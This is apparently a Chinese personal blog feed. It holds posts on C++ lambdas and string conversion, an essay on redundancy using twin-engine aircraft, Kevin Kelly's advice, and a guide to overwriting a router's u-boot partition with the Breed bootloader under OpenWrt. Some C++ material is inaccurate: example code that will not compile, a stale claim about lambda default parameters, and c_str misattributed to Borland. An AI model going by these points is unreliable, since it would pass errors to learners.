class="token punctuation">}</span><span class="token punctuation">;</span>     <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出：123</span>    <span class="token comment">//或通过“函数体”后面的‘()’传入参数</span>    <span class="token keyword">auto</span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span>cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="例3-值捕获">例3 值捕获</h3><p>值捕获和参数传递中的值传递类似，被捕获的变量的值在Lambda表达式创建时通过值拷贝的方式传入，因此随后对该变量的修改不会影响影响Lambda表达式中的值。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> f <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token punctuation">{</span> cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>     a <span class="token operator">=</span> <span class="token number">321</span><span class="token punctuation">;</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出：123</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="例4-引用捕获">例4 引用捕获</h3><p>使用引用捕获一个外部变量，只需要在捕获列表变量前面加上一个引用说明符&amp;</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> f <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span>a<span class="token punctuation">]</span> <span class="token punctuation">{</span> cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>     a <span class="token operator">=</span> <span class="token number">321</span><span class="token punctuation">;</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出：321</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="例5-隐式捕获">例5 隐式捕获</h3><p>让编译器根据函数体中的代码来推断需要捕获哪些变量，这种方式称之为<strong>隐式捕获</strong>。隐式捕获有两种方式，分别是<code>[=]</code>和<code>[&amp;]</code>。<code>[=]</code>表示以值捕获的方式捕获外部变量，<code>[&amp;]</code>表示以引用捕获的方式捕获外部变量。</p><h3 id="隐式值捕获">隐式值捕获</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> f <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment">// 值捕获</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出：123</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="隐式引用捕获">隐式引用捕获</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> f <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment">// 引用捕获</span>    a <span class="token operator">=</span> <span class="token number">321</span><span class="token punctuation">;</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出：321</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="lambda表达式参数说明">Lambda表达式参数说明</h2><p>Lambda表达式的参数和普通函数的参数类似，但是Lambda表达式中传递参数还有一些限制，主要有以下几点：</p><ol type="1"><li>参数列表中不能有默认参数</li><li>所有参数必须有参数名</li><li>不支持可变参数</li></ol><h3 id="例如-1">例如</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> main<span class="token punctuation">{</span>　　　　 <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> y <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"m:"</span> <span class="token operator">&lt;&lt;</span> m <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>            　　<span class="token comment">//输出m:16</span>        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"n:"</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>            <span class="token comment">//输出n:9</span>        <span class="token keyword">auto</span> gFunc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> function<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">auto</span> lFunc <span class="token operator">=</span> <span class="token function">gFunc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token function">lFunc</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        <span class="token keyword">auto</span> hFunc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">const</span> function<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> f<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">f</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">auto</span> a <span class="token operator">=</span> <span class="token function">hFunc</span><span class="token punctuation">(</span><span class="token function">gFunc</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">222</span><span class="token punctuation">;</span>        <span class="token keyword">auto</span> func <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>b<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">mutable</span> <span class="token punctuation">{</span> a <span class="token operator">=</span> <span class="token number">22</span><span class="token punctuation">;</span> b <span class="token operator">=</span> <span class="token number">333</span><span class="token punctuation">;</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a:"</span> <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" b:"</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a:"</span> <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" b:"</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token number">333</span><span class="token punctuation">;</span>        <span class="token keyword">auto</span> func2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">]</span> <span class="token punctuation">{</span> a <span class="token operator">=</span> <span class="token number">444</span><span class="token punctuation">;</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a:"</span> <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" b:"</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">auto</span> func3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token operator">-&gt;</span>function<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    　　　　　　 std<span class="token double-colon punctuation">::</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token operator">&gt;</span> f_display_42 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">print_num</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">f_display_42</span><span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　　<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用冗余规避风险，除非冗余本身就是风险</title>
      <link href="/2022/05/09/rong-yu-gui-bi-feng-xian-chu-fei-ta-ben-shen-jiu-shi-feng-xian/"/>
      <url>/2022/05/09/rong-yu-gui-bi-feng-xian-chu-fei-ta-ben-shen-jiu-shi-feng-xian/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>从一个领域吸取经验并将其应用于另一个领域</strong>是最可靠的创新公式之一</p></blockquote><p>最早的飞机都是单引擎。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.franklinfaraday.com/content/images/2021/09/Sikorsky-S-22.jpg"></p><p>上图中，飞机的动力全来自机首的那个螺旋桨。</p><p>那时的引擎很不可靠，经常发生事故。为了减少伤亡，也为了增加飞机的负荷，设计师开始为飞机添加第二个引擎。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.franklinfaraday.com/content/images/size/w1000/2021/09/dc-10-20-public-domain.jpg"></p><p>双引擎确实提高了性能，但也带来了额外的复杂性，反而造成了更多的伤亡。这是因为<strong>在空中，如果坏掉一个引擎，只剩下另一个引擎，这时飞机的推力是不均衡的，很难控制重心去安全降落</strong>。</p><p>从概率的角度看，如果一台引擎的故障率为25%，增加一个引擎后，飞机的故障率（任何一个引擎出现故障）会上升到<strong>44%</strong>！这意味着，<strong>如果你不能控制好剩下的那个引擎安全降落，那么添加第二个引擎会让你更容易坠毁</strong>。</p><p>后来，飞机发动机越来越强大和可靠，单个引擎的故障率大大降低，而且飞行员和工程师也终于学会如何在损失部分动力的情况下，更好地控制双引擎飞机，飞行才变得安全。</p><p>这对于个人和企业有巨大的启示意义。如果你已经有了一个事业（或工作），不要冒然扩展到第二个事业（或工作）。因为在初始阶段，增加的引擎会给你带来<strong>更多的风险</strong>。只有<strong>降低单引擎的故障率，并确保你只靠剩下的引擎也能安全降落</strong>，双引擎才会给你带来更高的安全性。</p><p>不幸的是，就像战争经常推动高风险的飞机设计，人们也通常会在经济困难的时候从事两份工作。如果第一份工作是高负荷的，你再去从事第二份工作，那么很可能到头来，你连第一份工作也保不住。如果那时第二份工作不足以让你维持生计，<strong>你就有麻烦了</strong>。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.franklinfaraday.com/content/images/size/w1000/2021/09/crash-fl.jpg"></p><p>不过，计算机时代使得情况有一点点变化。数字控制技术的进步，促成了多轴飞行器的诞生。它们都至少有四个微型引擎，每个引擎只负责总负载的一小部分。任何一个或两个失败，都很容易被其他人弥补。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.franklinfaraday.com/content/images/2021/09/pexels-marcelo-moreira-2225771.jpg"></p><p>同样的，在计算机和互联网出现之前，一个人几乎不可能有4个收入来源，但今天，一个人可以有多种小金额的收入来源，比如下班后开网约车、将住宅的空房间作为民宿出租等等。即使每个收入来源都不多，可能也比只有一个主要的收入来源更好、更安全。这里的关键是<strong>每个收入来源要尽可能独立，不要相互干扰</strong>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 人生 </tag>
            
            <tag> 大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++字符串处理（未完待续）</title>
      <link href="/2022/05/08/c-zi-fu-chuan-chu-li/"/>
      <url>/2022/05/08/c-zi-fu-chuan-chu-li/</url>
      
        <content type="html"><![CDATA[<h1 id="c字符串处理未完待续">C++字符串处理（未完待续）</h1><h2 id="string-转-char">string 转 char[]</h2><p>标准库的<strong>string</strong>类提供了3个成员函数来从一个<strong>string</strong>得到<strong>c</strong>类型的字符数组：<code>c_str()</code>,<code>data()</code>, <code>copy(p,n)</code></p><p><code>c_str()</code>是Borland封装的String类中的一个函数，它返回当前字符串的首字符地址。换种说法，<code>c_str()</code>函数返回一个指向正规C字符串的指针常量，内容与本string串相同。这是为了与C语言兼容，在C语言中没有string类型，故必须通过string类对象的成员函数<code>c_str()</code>把string对象转换成C中的字符串样式。</p><p><code>c_str()</code>的原型是：<code>const char\*c_str() const;</code></p><p><code>c_str()</code>生成一个constchar*指针，指向以空字符终止的数组。而data()与<code>c_str()</code>类似，但是返回的数组不以空字符终止。</p><p>注意：一定要使用<code>strcpy()</code>等函数来操作<code>c_str()</code>返回的指针。例如下面这样写就是错误的：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span><span class="token operator">*</span> c<span class="token punctuation">;</span> string s<span class="token operator">=</span><span class="token string">"1234"</span><span class="token punctuation">;</span> c <span class="token operator">=</span> s<span class="token punctuation">.</span>`<span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span>`<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上述代码中，c最后指向的内容是垃圾，因为s对象被析构，其内容被处理，同时编译器将会报错。正确代码如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token operator">*</span>cstr<span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>string <span class="token function">str</span> <span class="token punctuation">(</span><span class="token string">"Please split this phrase into tokens"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cstr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span> <span class="token punctuation">[</span>str<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">strcpy</span> <span class="token punctuation">(</span>cstr<span class="token punctuation">,</span> str<span class="token punctuation">.</span>`<span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span>`<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果一个函数要求<code>char*</code>参数，可以使用<code>c_str()</code>方法。<code>copy(p,n,size_type _Off = 0)</code>：</p><p>从<strong>string</strong>类型对象中至多复制n个字符到字符指针p指向的空间中。默认从首字符开始，但是也可以指定，开始的位置（<strong>记住从0开始</strong>）。返回真正从对象中复制的字符。第三个参数可以缺省。以下代码显示了<code>copy()</code>函数的用法：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">string str ("Please split this phrase into tokens");basic_string &lt;char&gt;:: size_type cc;char arr[20] = {0};basic_string &lt;char&gt;:: pointer arrayPtr = arr;cc = str.copy(arrayPtr,10);cout &lt;&lt; "The number of copied characters in cc is: "&lt;&lt; cc &lt;&lt; endl;cout &lt;&lt; "The copied characters array1 is: " &lt;&lt;endl;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="字符串数字转数值">字符串数字转数值</h2><h2 id="描述">描述</h2><p>C 库函数 **long int strtol(const char *str, char **endptr, intbase)<strong> 把参数 </strong>str<strong> 所指向的字符串根据给定的</strong>base** 转换为一个长整数（类型为 long int 型），base 必须介于 2和 36（包含）之间，或者是特殊值 0。</p><h2 id="声明">声明</h2><p>下面是 <code>strtol()</code> 函数的声明。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">long int strtol(const char *str, char **endptr, int base)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="参数">参数</h2><ul><li><strong>str</strong> -- 要转换为长整数的字符串。</li><li><strong>endptr</strong> -- 对类型为 char*的对象的引用，其值由函数设置为 <strong>str</strong>中数值后的下一个字符。</li><li><strong>base</strong> -- 基数，必须介于 2 和36（包含）之间，或者是特殊值 0。</li></ul><h2 id="返回值">返回值</h2><p>该函数返回转换后的长整数，如果没有执行有效的转换，则返回一个零值。</p><h2 id="实例">实例</h2><p>下面的实例演示了 <code>strtol()</code> 函数的用法。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){   char str[30] = "2030300 This is test";   char *ptr;   long ret;   ret = strtol(str, &amp;ptr, 10);   printf("数字（无符号长整数）是 %ld\n", ret);   printf("字符串部分是 |%s|", ptr);   return(0);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>补一个实际应用的例子，比如解析命令行：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;int str2i(const char *str, char split, char **endptr){    int ret = 0;    ret = strtol(str, endptr, 10);    if (*endptr != NULL) {        if (**endptr == split) {            *endptr += 1;        }    }    return ret;}int main(void){    char *test_str = "1,2,3,4,5";    char *end = NULL;    int res[5] = {0};    char *p_shift = test_str;    for (int i = 0; i &lt; 5; i++) {        res[i] = str2i(p_shift, ',', &amp;end);        p_shift = end;    }    for (int i = 0; i &lt; 5; i++) {        printf("%d ", res[i]);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以用来分割字符串里的数字：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/* strtoll example */#include &lt;stdio.h&gt;      /* printf, NULL */#include &lt;stdlib.h&gt;     /* strtoll */int main (){  char szNumbers[] = "1856892505 17b00a12b -01100011010110000010001101100 0x6fffff";  char* pEnd;  long long int lli1, lli2, lli3, lli4;  lli1 = strtoll (szNumbers, &amp;pEnd, 10);  lli2 = strtoll (pEnd, &amp;pEnd, 16);  lli3 = strtoll (pEnd, &amp;pEnd, 2);  lli4 = strtoll (pEnd, NULL, 0);  printf ("The decimal equivalents are: %lld, %lld, %lld and %lld.\n", lli1, lli2, lli3, lli4);  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-none"><code class="language-none">The decimal equivalents are: 1856892505, 6358606123, -208340076 and 7340031<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 编程 </tag>
            
            <tag> 锐格 </tag>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KK 70 岁感言</title>
      <link href="/2022/05/08/kk-70-sui-gan-yan/"/>
      <url>/2022/05/08/kk-70-sui-gan-yan/</url>
      
        <content type="html"><![CDATA[<p>上周4月28日是《失控》的作者凯文·凯利老师（Kevin Kelly）的70大寿。</p><p>最近三年的生日，他都要给年轻人写一些建议，今年写了<a href="https://kk.org/thetechnium/103-bits-of-advice-i-wish-i-had-known/">103条</a>，下面选出几条。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://cdn.beekka.com/blogimg/asset/202205/bg2022050520.webp"></p><ol type="1"><li>永远不要为你不想成为的人工作。</li><li>效率被高估了，休息被严重低估了。没有良好的休息，不可能有高效率。</li><li>不要追求更好的方法来尽快完成任务，而要追求更好的任务，让你做得不想停下来。</li><li>没有“准时”这回事，你要么迟到，要么早到。</li><li>回答“我要做什么？”，需要先回答“我要成为谁？”。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 人生 </tag>
            
            <tag> 大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenWrt环境下刷入Breed Bootloader</title>
      <link href="/2022/05/08/openwrt-huan-jing-xia-shua-ru-bootloader/"/>
      <url>/2022/05/08/openwrt-huan-jing-xia-shua-ru-bootloader/</url>
      
        <content type="html"><![CDATA[<p>路由器刷机变砖的原因多是意外覆盖了bootloader或启动分区，导致既无法启动，又无法恢复启动分区或Bootloader。</p><p>BreedWeb可以有效避免这一问题。不严谨地说，做到“刷不坏”。</p><blockquote><p>U-Boot 一个能够在很多嵌入式平台上使用的Bootloader，和BreedWeb各自独立，是平行关系。</p></blockquote><p><strong>breedWeb</strong>是<strong>hackpascal</strong>自行设计开发的一个全新的Bootloader，并用于取代 U-Boot，此 Bootloader 暂取名为 Breed，不是U-Boot，也不是 U-Boot 的改进版，是全新、独立的、跟 U-Boot 平级的Bootloader，Bootloader意思为引导加载器，即为用于加载操作系统的程序。它是一大类此类功能程序的统称。现在的BIOS、UEFI、GRUB、RedBoot、U-Boot、CFE、Breed 等都是 Bootloader。</p><p>Breed内部对自己做了保护，导致无法覆盖自己，即使刷了一些奇奇怪怪的毁坏性固件，也能重新进入Breed进行恢复操作。</p><p>当然，前提是<strong>固件刷写在是在Breed内完成的</strong>。</p><p>一定不要在原厂固件里刷不兼容的OpenWrt，或在OpenWrt里刷原厂，极易损坏设备。（OpenWrt官方认可的直刷版是可以的）</p><blockquote><p>Breed Web地址：<a href="https://www.right.com.cn/forum/thread-161906-1-1.html">https://www.right.com.cn/forum/thread-161906-1-1.html</a><br>Breed Web下载：<a href="https://www.right.com.cn/forum/thread-161906-1-1.html">https://breed.hackpascal.net/</a></p></blockquote><p>在OpenWrt下，系统对u-boot分区默认做了限制，需要使用插件解除：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">opkg <span class="token function">install</span> kmod-mtd-rwinsmod mtd-rw <span class="token assign-left variable">i_want_a_brick</span><span class="token operator">=</span><span class="token number">1</span>mtd <span class="token parameter variable">-r</span> <span class="token function">write</span> your_firmware.bin u-boot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>解除后可成功刷入。</p><p>（环境：Netgear 网件 R6220）</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 路由器 </tag>
            
            <tag> OpenWrt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言内存管理</title>
      <link href="/2022/05/05/c-yu-yan-nei-cun-guan-li/"/>
      <url>/2022/05/05/c-yu-yan-nei-cun-guan-li/</url>
      
